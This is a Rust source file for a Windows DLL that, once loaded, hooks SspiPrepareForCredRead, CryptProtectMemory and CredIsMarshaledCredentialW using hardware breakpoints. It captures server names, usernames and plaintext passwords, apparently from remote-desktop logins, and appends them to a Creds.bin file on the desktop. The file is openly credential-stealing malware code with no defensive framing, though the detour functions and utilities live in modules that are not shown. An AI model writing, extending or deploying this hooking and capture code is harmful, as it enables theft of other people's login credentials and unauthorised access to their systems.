mod utils;
mod detours;

use hwbp::manager::{install_hwbp, uninstall_all_hwbp};

use std::ffi::c_void;
use std::fs::OpenOptions;
use std::io::Write;
use std::thread;
use std::sync::{Mutex, OnceLock};
use windows_sys::Win32::Foundation::HINSTANCE;
use windows_sys::Win32::System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};

/// File name used for credential dumps written to the desktop.
const CREDENTIAL_FILE: &str = "Creds.bin";

/// Format template used when writing credentials to disk.
/// Fields are replaced verbatim: `{server}`, `{user}`, `{pass}`.
const CREDENTIAL_DATA_FMT: &str = "Server: {server}\nUsername: {user}\nPassword: {pass}\n\n";

/// Globals store *owned* captured data:
/// - `G_SERVER_NAME` and `G_USERNAME` hold UTF-16 code units (Vec<u16>).
/// - `G_TEMP_PASSWORD` holds raw bytes captured from memory (Vec<u8>).
///
/// Each is wrapped in a `OnceLock` to lazily initialize a `Mutex`-protected
/// buffer. This design avoids sending raw pointers between threads and keeps
/// the detour code simple.
static G_SERVER_NAME: OnceLock<Mutex<Vec<u16>>> = OnceLock::new();
static G_USERNAME: OnceLock<Mutex<Vec<u16>>> = OnceLock::new();
static G_TEMP_PASSWORD: OnceLock<Mutex<Vec<u8>>> = OnceLock::new();

/// DLL entry point.
///
/// This mirrors the Windows `DllMain` signature and dispatches on attach/detach.
///
/// # Behavior
/// - On `DLL_PROCESS_ATTACH` we spawn a detached thread to run `install_hooks()`.
///   Spawning *after* returning from `DllMain` avoids loader-lock deadlocks
///   when calling into the loader
/// - On `DLL_PROCESS_DETACH` (when `lpv_reserved` is null) we attempt to
///   uninstall HWBP hooks via `uninstall_all_hwbp()`.

#[unsafe(no_mangle)]
#[allow(non_snake_case, unused_variables)]
pub unsafe extern "system" fn DllMain(
    _dll_module: HINSTANCE,
    call_reason: u32,
    lpv_reserved: *mut c_void,
) -> i32 {
    match call_reason {
        DLL_PROCESS_ATTACH => {
            // Spawn a detached thread to perform initialization after DllMain returns.
            // Use catch_unwind to prevent unwinding into foreign code.
            let _ = thread::spawn(|| {
                let _ = std::panic::catch_unwind(|| {
                    install_hooks();
                });
            });
            1
        }
        DLL_PROCESS_DETACH => {
            // If lpv_reserved is null, the process is performing an explicit unload.
            // Attempt to uninstall hooks in that case.
            if lpv_reserved.is_null() {
                let _ = uninstall_all_hwbp();
            }
            1
        }
        _ => 1,
    }
}

/// Write captured credentials to the current user's desktop.
///
/// Returns `true` on success, `false` on any I/O or conversion failure.
///
/// # What it does
/// 1. Resolves the desktop directory using `utils::desktop_path()`.
/// 2. Snapshots the three global buffers under their Mutexes:
///    - Converts `Vec<u16>` contents to Rust `String` using `String::from_utf16_lossy`.
///    - Converts password bytes by calling `utils::utf16le_bytes_to_string`.
/// 3. Appends a formatted record to `Creds.bin` on the desktop.

pub fn write_credentials_to_desktop() -> bool {
    // Resolve desktop path, bail out on error.
    let mut path = match utils::desktop_path() {
        Ok(p) => p,
        Err(_e) => {
            return false;
        }
    };
    path.push(CREDENTIAL_FILE);

    // Snapshot owned data under locks, converting to Strings.
    // If a global wasn't initialized or the lock is poisoned, fall back to empty.
    let server = G_SERVER_NAME
        .get()
        .and_then(|m| m.lock().ok())
        .map(|v| String::from_utf16_lossy(&v))
        .unwrap_or_default();

    let user = G_USERNAME
        .get()
        .and_then(|m| m.lock().ok())
        .map(|v| String::from_utf16_lossy(&v))
        .unwrap_or_default();

    let password = G_TEMP_PASSWORD
        .get()
        .and_then(|m| m.lock().ok())
        .map(|buf| utils::utf16le_bytes_to_string(&buf))
        .unwrap_or_default();

    // Build the output line from template.
    let line = CREDENTIAL_DATA_FMT
        .replace("{server}", &server)
        .replace("{user}", &user)
        .replace("{pass}", &password);

    // Open (or create) the file in append mode and write the line.
    let mut file = match OpenOptions::new().create(true).append(true).open(&path) {
        Ok(f) => f,
        Err(_e) => {
            return false;
        }
    };

    file.write_all(line.as_ref()).is_ok()
}

/// Install hooks using a compact table-driven approach.
///
/// The `targets` table lists tuples of:
/// `(dll_name, exported_symbol, detour_function_pointer)`
///
/// For each target:
/// - `utils::get_address` resolves the exported function address (attempting
///   to use GetModuleHandle / optionally LoadLibrary).
/// - `install_hwbp` registers the detour using Hardware Breakpoint manager.
///
/// # Returns
/// `true` if all hooks were installed successfully; `false` if any resolution
/// or installation failed.
fn install_hooks() -> bool {
    // Targets to hook: DLL name, symbol name, detour pointer (as c_void).
    let targets: &[(&str, &str, *const c_void)] = &[
        (
            "secur32.dll",
            "SspiPrepareForCredRead",
            detours::sspi_prepare_for_cred_read_detour as *const c_void,
        ),
        (
            "crypt32.dll",
            "CryptProtectMemory",
            detours::crypt_protect_memory_detour as *const c_void,
        ),
        (
            "advapi32.dll",
            "CredIsMarshaledCredentialW",
            detours::cred_is_marshaled_credentialw_detour as *const c_void,
        ),
    ];

    let mut ok = true;

    for (dll, sym, detour) in targets {
        match utils::get_address(dll, sym) {
            Ok(addr) => {
                match install_hwbp(addr, *detour) {
                    Ok(_) => {
                        // Installed successfully — nothing else to do here.
                    }
                    Err(_e) => {
                        // Installation failed for this target; mark overall as failed.
                        ok = false;
                    }
                }
            }
            Err(_e) => {
                // Address resolution failed (module missing or symbol not found).
                ok = false;
            }
        }
    }

    ok
}
